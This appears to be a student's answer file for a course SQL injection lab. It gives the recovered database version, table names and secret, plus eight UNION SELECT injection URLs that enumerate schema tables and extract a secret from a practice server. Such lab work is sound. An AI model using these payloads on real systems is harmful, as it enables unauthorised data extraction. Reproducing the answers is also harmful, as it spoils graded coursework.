@@ -1,0 +1,12 @@
+proj2_inject3
+5.5.60
+HINT, SECRET, foo, inject3_users
+triquetrum
+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+table_name%2C+table_schema%2C+table_name%2C+table_name+FROM+information_schema.tables+WHERE+table_schema+%21%3D+%22information_schema%22+LIMIT+1+OFFSET+1+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+variable_name%2C+variable_name%2C+variable_value%2C+variable_value+FROM+information_schema.global_variables+WHERE+variable_name+LIKE+%22%25version%25%22+LIMIT+1+OFFSET+0+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+table_name%2C+table_schema%2C+table_name%2C+table_name+FROM+information_schema.tables+WHERE+table_schema+%21%3D+%22information_schema%22+LIMIT+1+OFFSET+0+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+table_name%2C+table_schema%2C+table_name%2C+table_name+FROM+information_schema.tables+WHERE+table_schema+%21%3D+%22information_schema%22+LIMIT+1+OFFSET+1+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+table_name%2C+table_schema%2C+table_name%2C+table_name+FROM+information_schema.tables+WHERE+table_schema+%21%3D+%22information_schema%22+LIMIT+1+OFFSET+2+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+table_name%2C+table_schema%2C+table_name%2C+table_name+FROM+information_schema.tables+WHERE+table_schema+%21%3D+%22information_schema%22+LIMIT+1+OFFSET+3+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+id%2C+id%2C+id%2C+secret+FROM+SECRET+WHERE+hash%3D%224ddfe28be389218b70d4eeca093679bf%22+LIMIT+1+OFFSET+0+%23
